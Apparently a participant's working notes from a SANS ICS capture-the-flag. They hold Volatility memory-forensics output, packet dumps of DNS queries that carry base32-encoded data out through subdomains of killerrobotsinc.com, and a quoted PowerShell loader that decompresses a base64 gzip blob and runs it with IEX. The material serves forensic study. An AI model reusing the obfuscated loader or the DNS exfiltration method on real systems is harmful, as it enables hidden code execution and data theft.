Command line : "C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\lmgrd.exe" -c "C:\Users\Public\Documents\Rockwell Automation\Activations;C:\ProgramData\Rockwell Automation\Dongle" -l "C:\Users\Public\Documents\Rockwell Automation\Activations\Logs\RSsvr.log" -z
************************************************************************
flexsvr.exe pid:   2816
Command line : flexsvr.exe -T WIN-6JGUAMP9Q3B 11.11 -1 -c "C:\Users\Public\Documents\Rockwell Automation\Activations;C:\ProgramData\Rockwell Automation\Dongle" -lmgrd_port 6978 --lmgrd_start 6012d591  -l "C:\Users\Public\Documents\Rockwell Automation\Activations\Logs\RSsvr.log"
************************************************************************
daq.exe pid:   1848
Command line : "C:\Program Files (x86)\Rockwell Software\Studio 5000\Common\V3\bin\daq.exe"
************************************************************************
RnaDirServer.e pid:   3148
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RnaDirServer.exe"
************************************************************************
RNADirMultiple pid:   3220
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RNADirMultiplexor.exe"
************************************************************************
RnaAeServer.ex pid:   3384
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RnaAeServer.exe"
************************************************************************
RnaAlarmMux.ex pid:   3420
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RnaAlarmMux.exe"
************************************************************************
SearchIndexer. pid:   3704
Command line : C:\Windows\system32\SearchIndexer.exe /Embedding
************************************************************************
dllhost.exe pid:   3888
Command line : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
************************************************************************
msdtc.exe pid:   4000
Command line : C:\Windows\System32\msdtc.exe
************************************************************************
WmiPrvSE.exe pid:   3984
Command line : C:\Windows\system32\wbem\wmiprvse.exe
************************************************************************
mscorsvw.exe pid:   4664
Command line : C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
************************************************************************
sppsvc.exe pid:   4552
Command line : C:\Windows\system32\sppsvc.exe
************************************************************************
svchost.exe pid:   4828
Command line : C:\Windows\System32\svchost.exe -k secsvcs
************************************************************************
rslinx.exe pid:   3508
Command line : "C:\Users\sans-ics-ctf\Downloads\artifacts\rslinx.exe" 
************************************************************************
svchost.exe pid:   3972
Command line : C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
************************************************************************
Launcher.exe pid:   4496
************************************************************************
LogixDesigner. pid:   5512
Command line : "C:\Program Files (x86)\Rockwell Software\Studio 5000\Logix Designer\ENU\v30\Bin\LogixDesigner.exe" "C:\Users\sans-ics-ctf\Documents\Studio 5000\Projects\boardwalk.ACD"
************************************************************************
RSOBSERV.EXE pid:   2620
Command line : "C:\Program Files (x86)\Rockwell Software\RSCommon\RSOBSERV.EXE"
************************************************************************
CompMgmtLaunch pid:   4900
************************************************************************
mmc.exe pid:   3124
Command line : "C:\Windows\system32\mmc.exe" "C:\Windows\system32\compmgmt.msc" /s
************************************************************************
powershell.exe pid:   6004
Command line : "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" 
************************************************************************
conhost.exe pid:   4960
Command line : \??\C:\Windows\system32\conhost.exe "1671598576195887319343296724-92819441838834921-1801706073-1730573058-884991134
************************************************************************
qoerutrrxnn.ex pid:   5908
Command line : "C:\Users\sans-ics-ctf\Downloads\artifacts\qoerutrrxnn.exe"
************************************************************************
notepad.exe pid:   3844
Command line : "C:\Windows\system32\notepad.exe" 
************************************************************************
audiodg.exe pid:   4452
Command line : C:\Windows\system32\AUDIODG.EXE 0xd64
************************************************************************
SearchProtocol pid:   5060
Command line : "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 
************************************************************************
SearchFilterHo pid:   5340
Command line : "C:\Windows\system32\SearchFilterHost.exe" 0 520 524 532 65536 528 
************************************************************************
memory.exe pid:   4984
Command line : "C:\Users\sans-ics-ctf\Downloads\artifacts\memory.exe" 
************************************************************************
conhost.exe pid:   6060
Command line : \??\C:\Windows\system32\conhost.exe "-9222309741769870482-2006256537-1499068392-651647098-479123698-7153256311317113649


./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 procdump -p
```



```
./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 netscan
Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x9232cd0          TCPv6    ::1:49696                      ::1:22350            ESTABLISHED      -1                      
0x103b0860         UDPv6    ::1:54159                      *:*                                   3972     svchost.exe    2021-01-28 15:29:44 UTC+0000
0x341af350         UDPv6    fe80::51bc:70eb:4aec:68e4:1900 *:*                                   3972     svchost.exe    2021-01-28 15:29:44 UTC+0000
0x35a48860         UDPv6    ::1:1900                       *:*                                   3972     svchost.exe    2021-01-28 15:29:44 UTC+0000
0x357a4cd0         TCPv6    ::1:22350                      ::1:49691            ESTABLISHED      -1                      
0x38d90d50         UDPv4    127.0.0.1:1900                 *:*                                   3972     svchost.exe    2021-01-28 15:29:44 UTC+0000
0x39dbccb0         UDPv4    192.168.111.159:1900           *:*                                   3972     svchost.exe    2021-01-28 15:29:44 UTC+0000
0x3998cbf0         TCPv6    ::1:49699                      ::1:22350            ESTABLISHED      -1                      
0x3b05b890         UDPv4    127.0.0.1:54160                *:*                                   3972     svchost.exe    2021-01-28 15:29:44 UTC+0000
0x57bad500         UDPv4    0.0.0.0:22350                  *:*                                   2444     CodeMeter.exe  2021-01-28 15:33:51 UTC+0000
0x7d96a650         UDPv4    0.0.0.0:22350                  *:*                                   2444     CodeMeter.exe  2021-01-28 15:48:57 UTC+0000
0x7d9afca0         UDPv4    0.0.0.0:22350                  *:*                                   2444     CodeMeter.exe  2021-01-28 15:49:47 UTC+0000
0x7d801220         TCPv4    0.0.0.0:49177                  0.0.0.0:0            LISTENING        488      services.exe   
0x7d804ee0         TCPv4    0.0.0.0:49177                  0.0.0.0:0            LISTENING        488      services.exe   
0x7d804ee0         TCPv6    :::49177                       :::0                 LISTENING        488      services.exe   
0x7d64dcd0         TCPv6    ::1:49725                      ::1:22350            ESTABLISHED      -1                      
0x7d672180         TCPv6    ::1:22350                      ::1:49701            ESTABLISHED      -1                      
0x7d6e8510         TCPv6    ::1:49700                      ::1:22350            ESTABLISHED      -1                      
0x7d709260         TCPv4    127.0.0.1:5241                 127.0.0.1:49880      ESTABLISHED      -1                      
0x7d790cd0         TCPv4    127.0.0.1:49880                127.0.0.1:5241       ESTABLISHED      -1                      
0x7d7d2010         TCPv4    127.0.0.1:5241                 127.0.0.1:49882      ESTABLISHED      -1                      
0x7d826cd0         TCPv4    127.0.0.1:5241                 127.0.0.1:49179      ESTABLISHED      -1                      
0x7d917cd0         TCPv6    ::1:49701                      ::1:22350            ESTABLISHED      -1                      
0x7d92d360         TCPv6    ::1:49693                      ::1:22350            ESTABLISHED      -1                      
0x7d947cd0         TCPv6    ::1:22350                      ::1:49700            ESTABLISHED      -1                      
0x7d954a40         TCPv4    127.0.0.1:49882                127.0.0.1:5241       ESTABLISHED      -1                      
0x7d97e8c0         TCPv6    ::1:22350                      ::1:49702            ESTABLISHED      -1                      
0x7da9fbc0         UDPv4    0.0.0.0:22350                  *:*                                   2444     CodeMeter.exe  2021-01-28 15:50:27 UTC+0000
0x7dd55220         UDPv4    0.0.0.0:22350                  *:*                                   2444     CodeMeter.exe  2021-01-28 16:02:54 UTC+0000
0x7de70220         UDPv4    192.168.111.159:138            *:*                                   4        System         2021-01-28 15:17:34 UTC+0000
0x7df5d1f0         UDPv4    192.168.111.159:137            *:*                                   4        System         2021-01-28 15:17:34 UTC+0000
0x7df8dec0         UDPv4    0.0.0.0:5355                   *:*                                   752      svchost.exe    2021-01-28 16:02:33 UTC+0000
0x7df8dec0         UDPv6    :::5355                        *:*                                   752      svchost.exe    2021-01-28 16:02:33 UTC+0000
0x7dfa6390         UDPv4    0.0.0.0:0                      *:*                                   752      svchost.exe    2021-01-28 15:17:34 UTC+0000
0x7dfa6390         UDPv6    :::0                           *:*                                   752      svchost.exe    2021-01-28 15:17:34 UTC+0000
0x7dfe3740         UDPv4    0.0.0.0:0                      *:*                                   1520     RNADiagnostics 2021-01-28 15:17:34 UTC+0000
0x7dfe3740         UDPv6    :::0                           *:*                                   1520     RNADiagnostics 2021-01-28 15:17:34 UTC+0000
0x7dfe3a60         UDPv4    0.0.0.0:0                      *:*                                   1520     RNADiagnostics 2021-01-28 15:17:34 UTC+0000
0x7e2669a0         UDPv6    fe80::51bc:70eb:4aec:68e4:546  *:*                                   736      svchost.exe    2021-01-28 16:00:22 UTC+0000
0x7da100a0         TCPv4    127.0.0.1:27050                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da13ee0         TCPv4    127.0.0.1:27051                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da14010         TCPv4    127.0.0.1:27052                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da18c80         TCPv4    127.0.0.1:27053                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da195f0         TCPv4    127.0.0.1:27054                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da1aee0         TCPv4    127.0.0.1:27055                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da1d2e0         TCPv4    127.0.0.1:27056                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da1f010         TCPv4    127.0.0.1:27100                0.0.0.0:0            LISTENING        2332     raOSGi.exe     
0x7da41de0         TCPv4    127.0.0.1:27024                0.0.0.0:0            LISTENING        1848     daq.exe        
0x7da8a640         TCPv4    127.0.0.1:54967                0.0.0.0:0            LISTENING        2692     FTActivationBo 
0x7dbb1010         TCPv4    0.0.0.0:4241                   0.0.0.0:0            LISTENING        788      RSLinxNG.exe   
0x7dbc0390         TCPv4    0.0.0.0:6543                   0.0.0.0:0            LISTENING        3384     RnaAeServer.ex 
0x7dc431f0         TCPv4    0.0.0.0:4255                   0.0.0.0:0            LISTENING        1764     RsvcHost.exe   
0x7dc6cba0         TCPv4    0.0.0.0:8082                   0.0.0.0:0            LISTENING        1520     RNADiagnostics 
0x7dce13d0         TCPv4    0.0.0.0:49167                  0.0.0.0:0            LISTENING        2816     flexsvr.exe    
0x7dd0e5a0         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        504      lsass.exe      
0x7dd0e5a0         TCPv6    :::49156                       :::0                 LISTENING        504      lsass.exe      
0x7dd0ec40         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        504      lsass.exe      
0x7dd1eee0         TCPv4    0.0.0.0:27000                  0.0.0.0:0            LISTENING        2740     lmgrd.exe      
0x7deff390         TCPv4    127.0.0.1:27027                0.0.0.0:0            LISTENING        1968     ramkMsgKernelS 
0x7df5ca60         TCPv4    192.168.111.159:139            0.0.0.0:0            LISTENING        4        System         
0x7dff2010         TCPv4    0.0.0.0:5241                   0.0.0.0:0            LISTENING        1764     RsvcHost.exe   
0x7dffec60         TCPv4    0.0.0.0:1332                   0.0.0.0:0            LISTENING        1412     RdcyHost.exe   
0x7e06c4c0         TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System         
0x7e06c4c0         TCPv6    :::445                         :::0                 LISTENING        4        System         
0x7e283380         TCPv4    0.0.0.0:54664                  0.0.0.0:0            LISTENING        5512     LogixDesigner. 
0x7da21010         TCPv4    127.0.0.1:49172                127.0.0.1:27027      ESTABLISHED      -1                      
0x7da214d0         TCPv4    127.0.0.1:27027                127.0.0.1:49172      ESTABLISHED      -1                      
0x7da3f610         TCPv6    ::1:22350                      ::1:49699            ESTABLISHED      -1                      
0x7da58b00         TCPv4    127.0.0.1:49173                127.0.0.1:27051      ESTABLISHED      -1                      
0x7da5a010         TCPv4    127.0.0.1:27051                127.0.0.1:49173      ESTABLISHED      -1                      
0x7da66010         TCPv6    ::1:22350                      ::1:49725            ESTABLISHED      -1                      
0x7da735e0         TCPv4    127.0.0.1:49175                127.0.0.1:27100      ESTABLISHED      -1                      
0x7da8ba30         TCPv4    127.0.0.1:49174                127.0.0.1:27027      ESTABLISHED      -1                      
0x7da9acd0         TCPv6    ::1:22350                      ::1:49695            ESTABLISHED      -1                      
0x7daa25d0         TCPv4    127.0.0.1:27027                127.0.0.1:49174      ESTABLISHED      -1                      
0x7dabe430         TCPv4    127.0.0.1:27100                127.0.0.1:49175      ESTABLISHED      -1                      
0x7db7f7c0         TCPv6    ::1:22350                      ::1:49692            ESTABLISHED      -1                      
0x7db9e7a0         TCPv4    127.0.0.1:49176                127.0.0.1:1332       ESTABLISHED      -1                      
0x7db9fcd0         TCPv4    127.0.0.1:1332                 127.0.0.1:49176      ESTABLISHED      -1                      
0x7dbf77c0         TCPv4    127.0.0.1:49179                127.0.0.1:5241       ESTABLISHED      -1                      
0x7dc8e620         TCPv6    ::1:49691                      ::1:22350            ESTABLISHED      -1                      
0x7dca7cd0         TCPv6    ::1:22350                      ::1:49696            ESTABLISHED      -1                      
0x7dd165d0         TCPv4    127.0.0.1:49169                127.0.0.1:49170      ESTABLISHED      -1                      
0x7dd28670         TCPv4    192.168.111.159:49456          192.168.111.142:443  CLOSE_WAIT       -1                      
0x7dd59420         TCPv4    127.0.0.1:27000                127.0.0.1:49171      ESTABLISHED      -1                      
0x7dd599c0         TCPv4    127.0.0.1:49171                127.0.0.1:27000      ESTABLISHED      -1                      
0x7dd8acd0         TCPv6    ::1:22350                      ::1:49698            ESTABLISHED      -1                      
0x7ddaa7a0         TCPv4    192.168.111.159:49968          192.168.111.142:443  CLOSED           -1                      
0x7ddce010         TCPv6    ::1:49692                      ::1:22350            ESTABLISHED      -1                      
0x7dde8cd0         TCPv6    ::1:49702                      ::1:22350            ESTABLISHED      -1                      
0x7de56b40         TCPv6    ::1:49695                      ::1:22350            ESTABLISHED      -1                      
0x7df8ccd0         TCPv4    127.0.0.1:5241                 127.0.0.1:49155      ESTABLISHED      -1                      
0x7e0cbcd0         TCPv6    ::1:49694                      ::1:22350            ESTABLISHED      -1                      
0x7e1a9cd0         TCPv4    127.0.0.1:49170                127.0.0.1:49169      ESTABLISHED      -1                      
0x7e2b8010         TCPv4    127.0.0.1:49155                127.0.0.1:5241       ESTABLISHED      -1                      
0x7e3091f0         TCPv6    ::1:22350                      ::1:49693            ESTABLISHED      -1                      
0x7e3855b0         TCPv4    192.168.111.159:49940          192.168.111.142:443  CLOSED           -1                      
0x7e4cda50         UDPv4    0.0.0.0:5355                   *:*                                   752      svchost.exe    2021-01-28 16:02:33 UTC+0000
0x7e4a8a60         TCPv4    0.0.0.0:403                    0.0.0.0:0            LISTENING        1792     FTAE_HistServ. 
0x7e4c9240         TCPv4    0.0.0.0:22350                  0.0.0.0:0            LISTENING        2444     CodeMeter.exe  
0x7e4c9240         TCPv6    :::22350                       :::0                 LISTENING        2444     CodeMeter.exe  
0x7e57b990         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        676      svchost.exe    
0x7e57d3e0         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        676      svchost.exe    
0x7e57d3e0         TCPv6    :::135                         :::0                 LISTENING        676      svchost.exe    
0x7e5848e0         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        384      wininit.exe    
0x7e5848e0         TCPv6    :::49152                       :::0                 LISTENING        384      wininit.exe    
0x7e587d90         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        384      wininit.exe    
0x7e59c7b0         TCPv4    0.0.0.0:7153                   0.0.0.0:0            LISTENING        788      RSLinxNG.exe   
0x7e5c3220         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        736      svchost.exe    
0x7e5c3220         TCPv6    :::49153                       :::0                 LISTENING        736      svchost.exe    
0x7e5c3860         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        736      svchost.exe    
0x7e90f010         TCPv4    0.0.0.0:22350                  0.0.0.0:0            LISTENING        2444     CodeMeter.exe  
0x7f13a4f0         TCPv4    0.0.0.0:3060                   0.0.0.0:0            LISTENING        3148     RnaDirServer.e 
0x7f17d010         TCPv6    ::1:49178                      ::1:22350            ESTABLISHED      -1                      
0x7f17da70         TCPv6    ::1:22350                      ::1:49178            ESTABLISHED      -1                      
0x7f2d17d0         TCPv6    ::1:49698                      ::1:22350            ESTABLISHED      -1                      
0x7f821af0         TCPv4    0.0.0.0:9111                   0.0.0.0:0            LISTENING        3384     RnaAeServer.ex 
0x7fa3c0a0         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        884      svchost.exe    
0x7fa3dac0         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        884      svchost.exe    
0x7fa3dac0         TCPv6    :::49154                       :::0                 LISTENING        884      svchost.exe    
0x7fedf2e0         TCPv6    ::1:22350                      ::1:49694            ESTABLISHED      -1                      

```

```
./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x220473 0xfffff900c1a8a7c0 R5NpY4n3K$Rz&J@!                                  
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
         1 WinSta0       CF_LOCALE                    0x190517 0xfffff900c01fca40                                                   
         1 WinSta0       0x0L                 0xffffff00000000 ------------------ 
```


## level3b


data exfiltration YPCUICZ.b32.killerrobotsinc.com
https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/

0000   52 4f 42 4f 54 32 52 4f 42 4f 54 31 08 00 45 00   ROBOT2ROBOT1..E.
0010   00 57 00 00 40 00 40 11 a7 ab c0 a8 01 01 c0 a8   .W..@.@.........
0020   10 99 00 35 80 01 00 43 00 00 37 29 81 80 00 00   ...5...C..7)....
0030   00 01 00 00 00 00 07 59 50 43 55 49 43 5a 03 62   .......YPCUICZ.b
0040   33 32 0f 6b 69 6c 6c 65 72 72 6f 62 6f 74 73 69   32.killerrobotsi
0050   6e 63 03 63 6f 6d 00 00 01 00 01 00 00 00 01 00   nc.com..........
0060   04 eb 8e b4 87                                    .....


lets export into csv pcapfile, some filtering with the script.py

0000   52 4f 42 4f 54 32 52 4f 42 4f 54 31 08 00 45 00   ROBOT2ROBOT1..E.
0010   00 56 00 00 40 00 40 11 a7 ac c0 a8 01 01 c0 a8   .V..@.@.........
0020   10 99 00 35 80 01 00 42 00 00 42 0b 81 80 00 00   ...5...B..B.....
0030   00 01 00 00 00 00 06 32 4f 4c 34 37 52 03 62 33   .......2OL47R.b3
0040   32 0f 6b 69 6c 6c 65 72 72 6f 62 6f 74 73 69 6e   2.killerrobotsin
0050   63 03 63 6f 6d 00 00 01 00 01 00 00 00 01 00 04   c.com...........
0060   c5 11 f2 b8                                       ....
0000   52 4f 42 4f 54 32 52 4f 42 4f 54 31 08 00 45 00   ROBOT2ROBOT1..E.
0010   00 56 00 00 40 00 40 11 a7 ac c0 a8 01 01 c0 a8   .V..@.@.........
0020   10 99 00 35 80 01 00 42 00 00 45 5f 81 80 00 00   ...5...B..E_....
0030   00 01 00 00 00 00 06 4d 4d 59 4a 4b 34 03 62 33   .......MMYJK4.b3
0040   32 0f 6b 69 6c 6c 65 72 72 6f 62 6f 74 73 69 6e   2.killerrobotsin
0050   63 03 63 6f 6d 00 00 01 00 01 00 00 00 01 00 04   c.com...........
0060   5b 56 0e ac                                       [V..


site interessant pour chercher des magic number de fichiers
https://filesignatures.net/index.php?search=42&mode=SIG
https://www.garykessler.net/library/file_sigs.html

frame 250829
00:1b:50:52:55:53
0c:96:bf:00:00:08



## level3e

ligne 23213

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("
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
"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();


best way to decode
echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode > file.zip


